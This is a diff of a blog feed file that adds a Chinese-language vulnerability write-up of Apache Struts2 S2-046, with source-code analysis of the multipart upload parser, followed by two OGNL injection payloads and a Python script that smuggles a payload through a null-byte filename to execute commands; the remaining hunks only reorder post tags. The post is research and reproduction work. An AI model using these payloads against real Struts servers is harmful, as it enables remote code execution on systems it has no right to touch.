@@ -4,6 +4,25 @@
   
   
   <entry>
+    <title>struts2系列漏洞 S2-046</title>
+    <link href="/2020/08/02/struts2%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E-S2-046/"/>
+    <url>/2020/08/02/struts2%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E-S2-046/</url>
+    
+    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>  经典 Java 软件漏洞 struts 系列，准备一个个看过去。</p><p>跟 S2-045 的原理相同，触发点不同。</p><a id="more"></a><hr><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>2.3.31 版本 struts2 + Tomcat 9。</p><p>修改 struts.xml，切换文件上传的解析器：</p><pre><code class="xml">&lt;constant name=&quot;struts.multipart.parser&quot; value=&quot;jakarta-stream&quot; /&gt;</code></pre><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>阅读漏洞通告，可以看出问题出在 Content-Disposition，即上传文件名等信息中。</p><p>漏洞触发点同样是在 buildErrorMessage，而 parse 函数会调用这个函数，不过是在 JakartaStreamMultiPartRequest 类中：</p><pre><code class="java">public void parse(HttpServletRequest request, String saveDir) throws IOException {    try {        setLocale(request);        processUpload(request, saveDir);    } catch (Exception e) {        e.printStackTrace();        String errorMessage = buildErrorMessage(e, new Object[]{});        if (!errors.contains(errorMessage))            errors.add(errorMessage);    }}</code></pre><p>只要 processUpload 函数中抛出一个可控的错误信息，就可以进行 OGNL 表达式注入，继续看 processUpload 函数：</p><pre><code class="java">private void processUpload(HttpServletRequest request, String saveDir) throws Exception {    // Sanity check that the request is a multi-part/form-data request.    if (ServletFileUpload.isMultipartContent(request)) {        // Sanity check on request size.        boolean requestSizePermitted = isRequestSizePermitted(request);        // Interface with Commons FileUpload API        // Using the Streaming API        ServletFileUpload servletFileUpload = new ServletFileUpload();        FileItemIterator i = servletFileUpload.getItemIterator(request);        // Iterate the file items        while (i.hasNext()) {            try {                FileItemStream itemStream = i.next();                // If the file item stream is a form field, delegate to the                // field item stream handler                if (itemStream.isFormField()) {                    processFileItemStreamAsFormField(itemStream);                }                // Delegate the file item stream for a file field to the                // file item stream handler, but delegation is skipped                // if the requestSizePermitted check failed based on the                // complete content-size of the request.                else {                    // prevent processing file field item if request size not allowed.                    // also warn user in the logs.                    if (!requestSizePermitted) {                        addFileSkippedError(itemStream.getName(), request);                        LOG.warn(&quot;Skipped stream &#39;#0&#39;, request maximum size (#1) exceeded.&quot;, itemStream.getName(), maxSize);                        continue;                    }                    processFileItemStreamAsFileField(itemStream, saveDir);                }            } catch (IOException e) {                e.printStackTrace();            }        }    }}</code></pre><p>我们先看看代表上传文件信息的 FileItemStream 接口，可以看到里面主要有获取 Content-Disposition 里三种信息的函数：</p><pre><code class="java">String getContentType();String getName();String getFieldName();</code></pre><p>我们再看这几个函数的具体实现，其中 getName 的实现与众不同：</p><pre><code class="java">public String getName() {    return Streams.checkFileName(name);}public static String checkFileName(String fileName) {    if (fileName != null  &amp;&amp;  fileName.indexOf(&#39;\u0000&#39;) != -1) {        // pFileName.replace(&quot;\u0000&quot;, &quot;\\0&quot;)        final StringBuilder sb = new StringBuilder();        for (int i = 0;  i &lt; fileName.length();  i++) {            char c = fileName.charAt(i);            switch (c) {                case 0:                    sb.append(&quot;\\0&quot;);                    break;                default:                    sb.append(c);                    break;            }        }        throw new InvalidFileNameException(fileName, &quot;Invalid file name: &quot; + sb);    }    return fileName;}</code></pre><p>可以看到，只要在文件名中包含一个 \x00，我们就可以控制抛出一个错误信息了，所以可以通过让 requestSizePermitted 为 false，从而触发里面的 itemStream.getName()，而 requestSizePermitted 来自 isRequestSizePermitted，只要将 Content-length 设置为一个很大的数字就可以了。</p><p>其实上这个漏洞不需要设置也能触发 Content-length，requestSizePermitted 为 true 时也会触发 processFileItemStreamAsFileField 函数：</p><pre><code class="java">private void processFileItemStreamAsFileField(FileItemStream itemStream, String location) {    // Skip file uploads that don&#39;t have a file name - meaning that no file was selected.    if (itemStream.getName() == null || itemStream.getName().trim().length() &lt; 1) {        LOG.debug(&quot;No file has been uploaded for the field: {}&quot;, itemStream.getFieldName());        return;    }    File file = null;    try {        // Create the temporary upload file.        file = createTemporaryFile(itemStream.getName(), location);        if (streamFileToDisk(itemStream, file))            createFileInfoFromItemStream(itemStream, file);    } catch (IOException e) {        if (file != null) {            try {                file.delete();            } catch (SecurityException se) {                se.printStackTrace();                LOG.warn(&quot;Failed to delete &#39;#0&#39; due to security exception above.&quot;, file.getName());            }        }    }}</code></pre><p>里面同样有 itemStream.getName()，也可以触发漏洞。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>在这个版本里面，_memberAccess 无法直接访问来修改，而 setMemberAccess 会被 isPackageExcluded 函数拦截，所以需要另寻他法，具体的分析可以看看参考文章，这里贴两个 payload：</p><pre><code>(#container=#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.excludedClasses.clear()).(#ognlUtil.excludedPackageNames.clear()).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(&#39;calc&#39;))</code></pre><p>更全面一点的：</p><pre><code>%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#39;calc&#39;).(#iswin=(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds=(#iswin?{&#39;cmd.exe&#39;,&#39;/c&#39;,#cmd}:{&#39;/bin/bash&#39;,&#39;-c&#39;,#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}</code></pre><p>最后的利用：</p><pre><code class="python"># -*- coding:utf8 -*-import requestsurl = &quot;http://localhost:8080&quot;files = {    &#39;upload&#39;: (        &#39;Twings\x00&#39; +        &#39;%{(#container=#context[\&#39;com.opensymphony.xwork2.ActionContext.container\&#39;]).&#39;        &#39;(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).&#39;        &#39;(#ognlUtil.excludedClasses.clear()).(#ognlUtil.excludedPackageNames.clear()).&#39;        &#39;(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).&#39;        &#39;(@java.lang.Runtime@getRuntime().exec(\&#39;calc\&#39;))}&#39;,        &#39;file data&#39;,        &#39;application/octet-stream&#39;,        {}    )}print requests.post(url, files=files).headers</code></pre><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>同 S2-045。</p><hr><p>参考文章：</p><p><a href="https://www.freebuf.com/vuls/129871.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/129871.html</a></p><p><a href="https://xz.aliyun.com/t/3395" target="_blank" rel="noopener">https://xz.aliyun.com/t/3395</a></p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>Web</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>struts2系列漏洞 S2-045</title>
     <link href="/2020/07/31/struts2%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E-S2-045/"/>
     <url>/2020/07/31/struts2%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E-S2-045/</url>
@@ -725,9 +744,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -803,11 +822,11 @@
     
     <tags>
       
-      <tag>Crypto</tag>
-      
       <tag>Web</tag>
       
       <tag>Pwn</tag>
+      
+      <tag>Crypto</tag>
       
     </tags>
     
@@ -826,9 +845,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -847,9 +866,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -868,9 +887,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -931,11 +950,11 @@
     
     <tags>
       
-      <tag>Crypto</tag>
-      
       <tag>Web</tag>
       
       <tag>Pwn</tag>
+      
+      <tag>Crypto</tag>
       
     </tags>
     
@@ -954,9 +973,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -975,9 +994,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -996,9 +1015,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -1017,9 +1036,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
       <tag>复现</tag>
       
@@ -1099,9 +1118,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -1160,9 +1179,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
       <tag>复现</tag>
       
@@ -1183,9 +1202,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -1204,9 +1223,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -1244,9 +1263,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -1265,9 +1284,9 @@
     
     <tags>
       
-      <tag>Crypto</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Crypto</tag>
       
     </tags>
     
@@ -1305,9 +1324,9 @@
     
     <tags>
       
-      <tag>Crypto</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Crypto</tag>
       
     </tags>
     
@@ -1326,9 +1345,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -1530,9 +1549,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
